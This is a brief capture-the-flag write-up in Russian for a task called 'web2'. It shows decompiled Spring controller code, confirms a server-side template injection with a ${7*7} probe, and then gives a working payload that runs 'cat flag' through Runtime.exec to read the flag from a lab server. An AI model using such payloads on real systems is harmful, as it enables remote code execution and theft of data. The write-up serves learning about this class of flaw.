# web2
При декомпиляции кода сервера можно обнаружить странный путь
```java
@GetMapping({"/doc/{document}"})
public void getDocument(@PathVariable String document) {
    System.out.println("This function is not ready yet");
}
```

Переменная document имеет уязвимость SSTI

_[http://192.168.12.13:8090/doc/__${7*7}__::x.](http://192.168.12.13:8090/doc/__${7*7}__::x.)_

> Error resolving template [doc/**49**]


_[http://192.168.12.13:8090/doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat flag").getInputStream()).next()}__::x.](http://192.168.12.13:8090/doc/__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7D__::x.)_
> Error resolving template [doc/**nto{abobovichasdfas}**]
